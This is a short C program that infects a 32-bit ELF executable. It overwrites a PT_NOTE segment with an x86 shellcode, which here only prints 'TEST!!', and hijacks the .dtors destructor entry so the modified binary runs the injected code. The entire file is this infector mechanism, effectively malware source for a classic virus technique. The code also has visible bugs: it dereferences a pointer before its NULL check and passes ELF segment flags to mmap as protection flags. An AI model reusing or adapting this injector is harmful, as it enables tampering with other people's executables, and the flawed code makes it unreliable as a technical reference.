#include <stdio.h>
#include <stdint.h>
#include <elf.h>
#include <sys/mman.h>

unsigned char code[32] = {
  0x90, 0x90, 0x90, 0x90, 0x90, 0x60, 0x6a, 0x04,
  0x58, 0x6a, 0x01, 0x5b, 0xe8, 0x07, 0x00, 0x00,
  0x00, 0x54, 0x45, 0x53, 0x54, 0x21, 0x21, 0x0a,
  0x59, 0x6a, 0x05, 0x5a, 0xcd, 0x80, 0x61, 0xc3,
};

int main(int argc, char **argv)
{
  if (argc < 2)
    return 2;
  int h = open(argv[1], 2);
  int l = lseek(h, 0, 2);
  char *m = mmap(NULL, l, PF_R|PF_W, MAP_SHARED, h, 0);
  if (m == MAP_FAILED)
    return 2;
  Elf32_Ehdr *ehdr = (Elf32_Ehdr*)m;
  Elf32_Phdr *phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);
  Elf32_Shdr *shdr = (Elf32_Shdr*)(m + ehdr->e_shoff);
  char *strtab = m + shdr[ehdr->e_shstrndx].sh_offset;
  int i;
  uint32_t *cons;
  for (cons = NULL, i = 1; i < ehdr->e_shnum; i++)
    if (! strcmp(strtab + shdr[i].sh_name, ".dtors"))
      cons = (uint32_t*)(m + shdr[i].sh_offset + shdr[i].sh_size - 4);
  printf("%08x %08x\n", cons[0], cons[1]);
  if (cons == NULL || cons[0] != 0 || cons[1] != 0)
    return 2;
  for (i = 0; i < ehdr->e_phnum; i++) {
    if (phdr[i].p_type == PT_NOTE) {
      phdr[i].p_type = PT_NULL;
      cons[0] = phdr[i].p_vaddr;
      memcpy(m + phdr[i].p_offset, code, 32);
    }
  }
  munmap(m, l);
  close(h);
  return 0;
}
